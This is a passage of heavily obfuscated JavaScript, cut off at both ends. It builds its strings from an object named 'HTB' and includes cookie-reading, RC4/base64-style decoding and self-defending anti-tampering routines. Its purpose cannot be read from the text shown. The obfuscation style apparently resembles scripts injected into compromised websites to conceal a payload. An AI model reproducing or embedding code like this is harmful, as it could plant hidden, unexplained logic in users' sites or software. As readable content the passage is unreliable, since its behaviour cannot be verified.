B.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$__+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$_$+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$$_+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$$$+"\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB._$$+"\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB._$_+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$___+"=\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.___+"/"+HTB._$$+HTB.$_$+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$___+"=\\\\',\\\\'"+HTB._$$+HTB.$_$+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$$_+"/"+HTB._$$+HTB.$$_+HTB.$$$+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$__$+"/"+HTB._$$+HTB.$$_+HTB.$_$+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.$__+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.___+"\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB._$_+"==\\\\',\\\\'"+HTB._$$+HTB.$$_+HTB._$$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$$_+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$_$+"=\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$__$+"=\\\\',\\\\'"+HTB._$$+HTB._$$+HTB.___+"==\\\\',\\\\'"+HTB._$$+HTB._$$+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB._$$+HTB._$_+"=\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$___+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$$$+"/"+HTB._$$+HTB._$_+HTB._$$+"==\\\\',\\\\'"+HTB._$$+HTB._$_+HTB._$_+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$__+"\\\\',\\\\'"+HTB._$$+HTB._$_+HTB.$_$+"=\\\\',\\\\'"+HTB._$_+HTB.$$$+HTB.__$+"=\\\\',\\\\'"+HTB._$$+HTB._$$+HTB._$$+"/"+HTB._$$+HTB._$$+HTB.$__+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.__$+"==\\\\',\\\\'"+HTB._$$+HTB.$__+HTB._$_+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB._$$+"=\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.$__+"\\\\',\\\\'"+HTB._$$+HTB.$__+HTB.___+"=\\\\'];("+HTB.$$$+"("+HTB.$___+HTB.___+","+HTB.__$+HTB.$$$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB._$_+"="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.$$_+"){"+HTB.__$+HTB.$$$+HTB.$$_+"(--"+HTB.__$+HTB.$$_+HTB.$$_+"){"+HTB.$___+HTB.___+"[\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.$___+HTB.___+"[\\\\'"+HTB._$$+HTB._$$+HTB.$__$+"\\\\']())}},"+HTB._$_+HTB._$_+HTB.___+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.$___+"={\\\\'"+HTB._$$+HTB._$$+HTB.$_$+"\\\\':{\\\\'"+HTB._$$+HTB._$$+HTB.$$_+"\\\\':\\\\'"+HTB.__$+HTB.$_$+HTB.$$$+"\\\\',\\\\'"+HTB.$__+HTB.$__+"\\\\':\\\\'"+HTB._$$+HTB._$$+HTB.$$$+"\\\\'},\\\\'"+HTB._$_+HTB.$__+HTB.___+"\\\\':"+HTB.$$$+"("+HTB._$$+HTB.$__+","+HTB.__$+HTB.$__+HTB._$_+","+HTB.__$+HTB._$$+HTB.$__$+","+HTB.$$_+HTB.$__+"){"+HTB.$$_+HTB.$__+"="+HTB.$$_+HTB.$__+"||{};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.___+"="+HTB.__$+HTB.$__+HTB._$_+"+\\\\'=\\\\'+"+HTB.__$+HTB._$$+HTB.$__$+","+HTB._$$+HTB._$$+HTB.$___+"=-"+HTB._$_+HTB.$__+HTB.__$+"+"+HTB._$_+HTB.$__+HTB._$$+"+"+HTB._$_+HTB.$__+HTB.$__+"*-"+HTB._$_+HTB.__$+";"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB._$_+"="+HTB.$_$+HTB.$__$+"*"+HTB.__$+HTB.___+HTB._$$+"+"+HTB._$_+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$___+HTB.$__+","+HTB.__$+HTB.___+HTB.___+"="+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$_$+HTB._$_+"&lt;"+HTB.__$+HTB.___+HTB.___+";"+HTB.$_$+HTB._$_+"++){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$$_+"="+HTB._$$+HTB.$__+"["+HTB.$_$+HTB._$_+"];"+HTB.$$$+HTB.___+"+=\\\\';\\\\\\\\"+HTB.__$+HTB.$___+"\\\\'+"+HTB.$__$+HTB.$$_+";"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB._$_+"="+HTB._$$+HTB.$__+"["+HTB.$__$+HTB.$$_+"];"+HTB._$$+HTB.$__+"[\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.$$$+HTB._$_+"),"+HTB.__$+HTB.___+HTB.___+"="+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'],"+HTB.$$$+HTB._$_+"!==!![]&amp;&amp;("+HTB.$$$+HTB.___+"+=\\\\'=\\\\'+"+HTB.$$$+HTB._$_+")}"+HTB.$$_+HTB.$__+"[\\\\'"+HTB.__$+HTB.$_$+HTB.$$$+"\\\\']="+HTB.$$$+HTB.___+"},\\\\'"+HTB.$__$+HTB._$_+"\\\\':"+HTB.$$$+"(){"+HTB.$___+"\\\\'"+HTB._$$+HTB.$$$+HTB.___+"\\\\'},\\\\'"+HTB._$_+HTB.__$+HTB._$_+"\\\\':"+HTB.$$$+"("+HTB.$$_+HTB.$$$+","+HTB.__$+HTB._$$+HTB.$__+"){"+HTB.$$_+HTB.$$$+"="+HTB.$$_+HTB.$$$+"||"+HTB.$$$+"("+HTB.__$+HTB.$_$+HTB._$$+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB._$$+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$$_+"="+HTB.$$_+HTB.$$$+"("+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"(\\\\'(?:^|;\\\\\\\\"+HTB.__$+HTB.$___+")\\\\'+"+HTB.__$+HTB._$$+HTB.$__+"[\\\\'"+HTB._$_+HTB._$$+HTB.$__+"\\\\'](/([.$?*|{}()[]\\\\\\\\/+^])/"+HTB._$_+HTB.$$_+HTB.$__$+",\\\\'$"+HTB.__$+"\\\\')+\\\\'=([^;]*)\\\\')),"+HTB.__$+HTB.$$_+HTB.$___+"="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.$_$+","+HTB.__$+HTB._$$+HTB.$_$+"){"+HTB.__$+HTB.$$_+HTB.$_$+"(++"+HTB.__$+HTB._$$+HTB.$_$+")};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB.$___+"("+HTB.__$+HTB.$$_+HTB._$_+","+HTB.__$+HTB.$$$+HTB.___+"),"+HTB.$$$+HTB.$$_+"?"+HTB.__$+HTB.$__$+HTB.__$+"("+HTB.$$$+HTB.$$_+"[-"+HTB.__$+HTB.$___+HTB._$$+"+"+HTB.__$+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB.___+"*-"+HTB.__$+HTB._$_+HTB.$$_+"]):"+HTB.$_$+HTB.$$$+"}},"+HTB.__$+HTB.$___+HTB.$$$+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.__$+"="+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"(\\\\'\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\\\\\"+HTB.$$$+HTB._$$+"(\\\\\\\\"+HTB.$$$+HTB._$$+")\\\\\\\\"+HTB.__$+HTB.$___+"*{\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"].+[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"];?\\\\\\\\"+HTB.__$+HTB.$___+"*}\\\\');"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.__$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$$+"\\\\']("+HTB._$_+HTB.$___+"[\\\\'"+HTB.$__$+HTB._$_+"\\\\'][\\\\'"+HTB.$$_+HTB.$__$+"\\\\']())};"+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB._$$+HTB.$$$+"\\\\']="+HTB.__$+HTB.$___+HTB.$$$+";"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.__$+HTB.$$_+"=\\\\'\\\\';"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$__+"="+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB._$$+HTB.$$$+"\\\\']();"+HTB.__$+HTB.$__$+"(!"+HTB.__$+HTB.___+HTB.$__+")"+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB.$__+HTB.___+"\\\\']([\\\\'*\\\\'],\\\\'"+HTB._$_+HTB.__$+HTB._$$+"\\\\',"+HTB.__$+HTB.___+HTB.$_$+"*-"+HTB.$_$+HTB.___+"+-"+HTB.__$+HTB.$___+HTB.__$+"*-"+HTB.$___+HTB.__$+"+-"+HTB._$_+HTB.$__+HTB.$__$+");"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$__+"?"+HTB._$_+HTB.__$+HTB.$$_+"="+HTB._$_+HTB.$___+"[\\\\'"+HTB._$_+HTB.__$+HTB._$_+"\\\\']("+HTB.$__+HTB.$_$+",\\\\'"+HTB._$_+HTB.__$+HTB._$$+"\\\\'):"+HTB._$_+HTB.$___+"[\\\\'"+HTB.$__$+HTB._$_+"\\\\']()};"+HTB._$_+HTB._$_+HTB.___+"()}("+HTB.$___+HTB.$__$+",-"+HTB.__$+HTB.$___+HTB.___+"+-"+HTB.__$+HTB.$$$+HTB.$__+"+-"+HTB.__$+HTB.__$+"*-"+HTB._$_+HTB.$$_+HTB.__$+"));"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+"="+HTB.$$$+"("+HTB._$$+HTB.$_$+","+HTB.__$+HTB.$$_+HTB.$__$+"){"+HTB._$$+HTB.$_$+"="+HTB._$$+HTB.$_$+"-(-"+HTB._$_+HTB.$__+HTB.__$+"+"+HTB._$_+HTB.$__+HTB._$$+"+"+HTB._$_+HTB.$__+HTB.$__+"*-"+HTB._$_+HTB.__$+");"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"="+HTB.$___+HTB.$__$+"["+HTB._$$+HTB.$_$+"];"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$$_+"[\\\\'"+HTB._$_+HTB._$_+HTB.$_$+"\\\\']==="+HTB.$_$+HTB.$$$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+HTB.$$$+"="+HTB.$$$+"("+HTB._$_+HTB._$$+HTB.___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__$+HTB.$__+"=\\\\'"+HTB._$_+HTB.$_$+HTB.$__$+"+/=\\\\',"+HTB.__$+HTB.$___+HTB.$_$+"="+HTB.$__$+HTB.$$$+"("+HTB._$_+HTB._$$+HTB.___+")[\\\\'"+HTB._$_+HTB._$$+HTB.$__+"\\\\'](/=+$/,\\\\'\\\\');"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$___+"=\\\\'\\\\';"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$_$+"="+HTB.$_$+HTB.$__$+"*"+HTB.__$+HTB.___+HTB._$$+"+"+HTB._$_+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$___+HTB.$__+","+HTB.$_$+HTB.$$_+","+HTB._$_+HTB.$$$+","+HTB._$_+HTB.__$+HTB.__$+"=-"+HTB.__$+HTB.$___+HTB._$$+"+"+HTB.__$+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB.$$$+"*-"+HTB.__$+HTB._$$+HTB.$$$+";"+HTB._$_+HTB.$$$+"="+HTB.__$+HTB.$___+HTB.$_$+"[\\\\'"+HTB._$_+HTB.$_$+HTB.$___+"\\\\']("+HTB._$_+HTB.__$+HTB.__$+"++);~"+HTB._$_+HTB.$$$+"&amp;&amp;("+HTB.$_$+HTB.$$_+"="+HTB.$$$+HTB.$_$+"%("+HTB.__$+HTB.___+HTB.$_$+"*-"+HTB.$_$+HTB.___+"+-"+HTB.__$+HTB.$___+HTB.__$+"*-"+HTB.$___+HTB.__$+"+-"+HTB._$_+HTB.$_$+HTB.$$_+")?"+HTB.$_$+HTB.$$_+"*(-"+HTB.__$+HTB.$___+HTB.___+"+-"+HTB.__$+HTB.$$$+HTB.$__+"+-"+HTB._$_+HTB.__$+"*-"+HTB._$_+HTB.$_$+HTB.$_$+")+"+HTB._$_+HTB.$$$+":"+HTB._$_+HTB.$$$+","+HTB.$$$+HTB.$_$+"++%("+HTB._$_+HTB.__$+"*"+HTB._$_+HTB.$_$+HTB._$_+"+-"+HTB._$_+HTB.$_$+HTB._$$+"*"+HTB._$_+HTB.__$+"+"+HTB._$_+HTB.$_$+HTB.$__+"))?"+HTB.__$+HTB.___+HTB.$___+"+="+HTB.$__$+HTB.$$$+"[\\\\'"+HTB._$_+HTB.__$+HTB.$$$+"\\\\'](-"+HTB._$_+HTB.$$_+HTB.___+"*"+HTB.__$+HTB.__$+"+"+HTB._$_+HTB.$$_+HTB.$$$+"+"+HTB._$_+HTB.$$_+HTB.$___+"*-"+HTB._$_+HTB._$$+HTB.$___+"&amp;"+HTB.$_$+HTB.$$_+">>(-(-"+HTB._$_+HTB.$$_+HTB.$$_+"+"+HTB._$_+HTB.$$_+HTB.$_$+"*-"+HTB.__$+HTB.__$+"+"+HTB._$_+HTB.$_$+HTB.__$+")*"+HTB.$$$+HTB.$_$+"&amp;-"+HTB._$_+HTB.$$_+HTB._$_+"+"+HTB.__$+HTB.__$+"*-"+HTB._$_+HTB.$$_+HTB._$$+"+-"+HTB._$_+HTB.$$_+HTB.$__+"*-"+HTB._$_+HTB.$__$+")):"+HTB._$_+HTB.$__$+"*"+HTB._$_+HTB.$__+HTB.$_$+"+"+HTB._$_+HTB.$__+HTB.$___+"+-"+HTB._$_+HTB.$__+HTB.$$_+"){"+HTB._$_+HTB.$$$+"="+HTB.__$+HTB.$__$+HTB.$__+"[\\\\'"+HTB._$_+HTB.$__+HTB.$$$+"\\\\']("+HTB._$_+HTB.$$$+")}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.___+HTB.$___+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+HTB.$__+"="+HTB.$$$+"("+HTB._$_+HTB.$_$+","+HTB.__$+HTB.__$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+"=[],"+HTB._$_+HTB.___+"=-"+HTB._$_+HTB.$$$+HTB.___+"*-"+HTB.__$+HTB.__$+"+-"+HTB._$$+HTB._$_+HTB.$$_+"+"+HTB.$__+HTB.___+HTB._$_+","+HTB.$__+HTB.___+","+HTB.$$$+HTB.$___+"=\\\\'\\\\',"+HTB.$__$+HTB.$___+"=\\\\'\\\\';"+HTB._$_+HTB.$_$+"="+HTB.__$+HTB.$$$+HTB.$$$+"("+HTB._$_+HTB.$_$+");"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.$_$+"=-"+HTB._$_+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB._$$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB.$__+"+"+HTB.$__+HTB.$__$+HTB.$_$+"*"+HTB.__$+HTB.___+HTB._$$+","+HTB.__$+HTB.$__$+HTB.$__$+"="+HTB._$_+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$$_+HTB.$_$+"&lt;"+HTB.__$+HTB.$__$+HTB.$__$+";"+HTB.$$_+HTB.$_$+"++){"+HTB.$__$+HTB.$___+"+=\\\\'%\\\\'+(\\\\'"+HTB.$__+HTB.$__$+HTB.$$_+"\\\\'+"+HTB._$_+HTB.$_$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.$$_+HTB.$_$+")[\\\\'"+HTB.$$_+HTB.$__$+"\\\\']("+HTB.$__+HTB.$__$+HTB._$_+"+"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.___+"+"+HTB.$__+HTB.$__$+HTB.__$+"*-"+HTB.__$+HTB.__$+"))[\\\\'"+HTB.$__+HTB.$___+HTB.$$$+"\\\\'](-(-"+HTB.$__+HTB.$___+HTB.$___+"*-"+HTB._$_+HTB.__$+"+"+HTB.$__+HTB.$___+HTB.$__$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$__$+HTB.___+"))}"+HTB._$_+HTB.$_$+"="+HTB.__$+HTB.$__$+HTB.__$+"("+HTB.$__$+HTB.$___+");"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+";"+HTB._$_+HTB.$__+"("+HTB.__$+HTB._$_+"="+HTB.$__+HTB.$__$+HTB.$$$+"+-"+HTB.$__+HTB.$__$+HTB.$___+"+"+HTB._$_+HTB.__$+HTB.$_$+"*-"+HTB.$_$+HTB.___+HTB.$_$+";"+HTB.__$+HTB._$_+"&lt;"+HTB.$_$+HTB.___+HTB.$$_+"+"+HTB.$_$+HTB.___+HTB.$$$+"+-"+HTB.$_$+HTB.___+HTB.$__+";"+HTB.__$+HTB._$_+"++){"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB._$_+"}"+HTB._$_+HTB.$__+"("+HTB.__$+HTB._$_+"="+HTB.$_$+HTB.___+HTB._$$+"+"+HTB.$__+HTB.$__$+HTB.$__$+"+-"+HTB.$_$+HTB.___+HTB.___+";"+HTB.__$+HTB._$_+"&lt;-"+HTB.$_$+HTB.___+HTB.__$+"+-"+HTB.$_$+HTB.___+HTB._$_+"+"+HTB.$__+HTB.$___+HTB.$$_+";"+HTB.__$+HTB._$_+"++){"+HTB._$_+HTB.___+"=("+HTB._$_+HTB.___+"+"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]+"+HTB.__$+HTB.__$+HTB.__$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.__$+HTB._$_+"%"+HTB.__$+HTB.__$+HTB.__$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\']))%("+HTB._$_+HTB.$__$+"*-"+HTB.$__+HTB.$___+HTB.$_$+"+-"+HTB.$__+HTB.$$$+HTB.___+"+"+HTB.$__+HTB.$$$+HTB.__$+"),"+HTB.$__+HTB.___+"="+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"],"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"],"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"]="+HTB.$__+HTB.___+"}"+HTB.__$+HTB._$_+"=-"+HTB.$__+HTB.$$$+HTB._$_+"+"+HTB.__$+HTB._$$+HTB.__$+"*"+HTB.$__+HTB.$$$+HTB._$$+"+-"+HTB.$__+HTB.$$_+HTB.$__$+","+HTB._$_+HTB.___+"="+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$___+"+"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$__+"+"+HTB.$__+HTB.$$_+HTB.$_$+"*-"+HTB.__$+HTB.__$+";"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB.__$+"="+HTB.$__+HTB.$$_+HTB.$$_+"+-"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$$_+HTB.$$$+"+-"+HTB._$_+HTB._$$+HTB.__$+"*-"+HTB.$__+HTB.$$$+HTB.$__+";"+HTB.$_$+HTB.__$+"&lt;"+HTB._$_+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$_$+HTB.__$+"++){"+HTB.__$+HTB._$_+"=("+HTB.__$+HTB._$_+"+("+HTB.$__+HTB.$$$+HTB.$_$+"+"+HTB._$_+HTB._$$+HTB.$_$+"*"+HTB.$__+HTB.$___+HTB._$_+"+-"+HTB._$_+HTB.$__$+"*"+HTB.$__+HTB.$___+HTB._$$+"))%("+HTB._$_+HTB.__$+HTB.___+"*-"+HTB.$__+HTB.$___+HTB.$__+"+"+HTB.$_$+HTB.$__$+"*"+HTB.$__+HTB.$___+HTB.__$+"+"+HTB.__$+HTB.__$+"*"+HTB.$__+HTB.$___+HTB.___+"),"+HTB._$_+HTB.___+"=("+HTB._$_+HTB.___+"+"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"])%(-"+HTB.$__+HTB.$$$+HTB.$$_+"+"+HTB.$__+HTB.$$$+HTB.$$$+"+"+HTB._$_+HTB.$__$+"*-"+HTB.$_$+HTB.___+HTB.$__$+"),"+HTB.$__+HTB.___+"="+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"],"+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]="+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"],"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"]="+HTB.$__+HTB.___+","+HTB.$$$+HTB.$___+"+="+HTB.$__$+HTB.$$$+"[\\\\'"+HTB._$_+HTB.__$+HTB.$$$+"\\\\']("+HTB._$_+HTB.$_$+"[\\\\'"+HTB.$___+HTB.$__+"\\\\']("+HTB.$_$+HTB.__$+")^"+HTB.__$+HTB.$$$+"[("+HTB.__$+HTB.$$$+"["+HTB.__$+HTB._$_+"]+"+HTB.__$+HTB.$$$+"["+HTB._$_+HTB.___+"])%("+HTB.$__+HTB.$$$+HTB.$__$+"*-"+HTB.__$+HTB.__$+"+-"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.___+HTB.$___+"+-"+HTB.$_$+HTB.__$+HTB.$$$+")])}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$___+"};"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$$+"\\\\']="+HTB._$_+HTB._$_+HTB.$__+","+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']={},"+HTB.__$+HTB.$$_+"[\\\\'"+HTB._$_+HTB._$_+HTB.$_$+"\\\\']=!![]}"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.__$+"="+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']["+HTB._$$+HTB.$_$+"];"+HTB.__$+HTB.$__$+"("+HTB.$__$+HTB.__$+"==="+HTB.$_$+HTB.$$$+"){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$_+"\\\\']==="+HTB.$_$+HTB.$$$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.$___+"="+HTB.$$$+"("+HTB._$_+HTB.__$+HTB.$__+"){"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$_$+HTB._$_+"\\\\']="+HTB._$_+HTB.__$+HTB.$__+","+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']=["+HTB.$_$+HTB._$$+HTB.$__$+"+-"+HTB.$_$+HTB.$__+HTB.___+"+-"+HTB.$_$+HTB.$__+HTB.__$+"*-"+HTB.__$+HTB.$___+HTB.$__$+","+HTB.$_$+HTB._$$+HTB.$___+"+-"+HTB.$_$+HTB._$$+HTB.$$$+"+"+HTB.$_$+HTB._$$+HTB._$$+"*"+HTB._$_+HTB._$_+HTB.__$+",-"+HTB.$_$+HTB._$$+HTB.$__+"+"+HTB.$_$+HTB._$$+HTB.$_$+"+-"+HTB.$_$+HTB._$$+HTB.$$_+"],"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$_+"\\\\']="+HTB.$$$+"(){"+HTB.$___+"\\\\'"+HTB.$_$+HTB.$__+HTB._$_+"\\\\'},"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.$$$+"\\\\']=\\\\'\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\\\\\"+HTB.$$$+HTB._$$+"(\\\\\\\\"+HTB.$$$+HTB._$$+")\\\\\\\\"+HTB.__$+HTB.$___+"*{\\\\\\\\"+HTB.$_$+HTB._$$+"+\\\\\\\\"+HTB.__$+HTB.$___+"*\\\\',"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.___+"\\\\']=\\\\'[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"].+[\\\\\\\\"+HTB.$_$+HTB.$___+"|\\\\\\\\"+HTB._$$+HTB.$__$+"];?\\\\\\\\"+HTB.__$+HTB.$___+"*}\\\\'};"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.$__+HTB.$___+"\\\\']="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+HTB.$___+"="+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.$__$+"("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.$$$+"\\\\']+"+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB.___+"\\\\']),"+HTB.__$+HTB.$$_+HTB.$$$+"="+HTB.__$+HTB._$_+HTB.$___+"[\\\\'"+HTB.__$+HTB._$$+HTB._$$+"\\\\']("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$$+HTB._$_+"\\\\'][\\\\'"+HTB.$$_+HTB.$__$+"\\\\']())?--"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']["+HTB.__$+HTB.__$+"*"+HTB.$_$+HTB.$__+HTB._$$+"+"+HTB.$_$+HTB.$_$+HTB.___+"+-"+HTB._$$+HTB.$$$+HTB.__$+"]:--"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\']["+HTB.$_$+HTB.$_$+HTB.__$+"*-"+HTB.__$+HTB._$_+HTB.$_$+"+-"+HTB.$_$+HTB.$_$+HTB._$_+"*"+HTB.__$+HTB.__$+"+"+HTB.$_$+HTB.$__+HTB.$__$+"];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$$_+HTB.$__+"\\\\']("+HTB.__$+HTB.$$_+HTB.$$$+")},"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.$$_+HTB.$__+"\\\\']="+HTB.$$$+"("+HTB.$__$+HTB.___+"){"+HTB.__$+HTB.$__$+"(!"+HTB.$_$+HTB.$__+HTB.$___+"(~"+HTB.$__$+HTB.___+"))"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__$+HTB.___+";"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB._$_+HTB._$_+"\\\\']("+HTB.__$+HTB._$$+"[\\\\'"+HTB.__$+HTB.$_$+HTB._$_+"\\\\'])},"+HTB.$__+HTB.$___+"[\\\\'"+HTB.__$+HTB.___+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB._$_+HTB._$_+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB.__$+HTB.$__$+"){"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB._$_+"="+HTB.__$+HTB.$$$+